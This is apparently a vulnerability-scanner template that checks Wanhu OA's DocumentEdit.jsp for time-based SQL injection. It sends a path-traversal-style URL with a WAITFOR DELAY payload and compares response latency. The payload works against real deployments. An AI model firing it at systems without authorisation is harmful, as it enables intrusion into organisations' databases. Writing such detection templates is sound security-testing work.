id: wanhu-oa-documentedit-sqli

info:
  name: 万户OA DocumentEdit.jsp SQL注入漏洞
  author: zan8in
  severity: high
  verified: true
  tags: wanhu,sqli
  created: 2023/12/08

rules:
  r0:
    request:
      method: GET
      path: /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'00:00:10'--
    expression: response.status == 200 && response.latency <= 11000 &&  response.latency >= 10000
  r1:
    request:
      method: GET
      path: /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'00:00:05'--
    expression: response.status == 200 && response.latency <= 6000 &&  response.latency >= 5000
  r2:
    request:
      method: GET
      path: /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'00:00:10'--
    expression: response.status == 200 && response.latency <= 11000 &&  response.latency >= 10000
  r3:
    request:
      method: GET
      path: /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'00:00:05'--
    expression: response.status == 200 && response.latency <= 6000 &&  response.latency >= 5000
expression: r0() && r1() && r2() && r3()
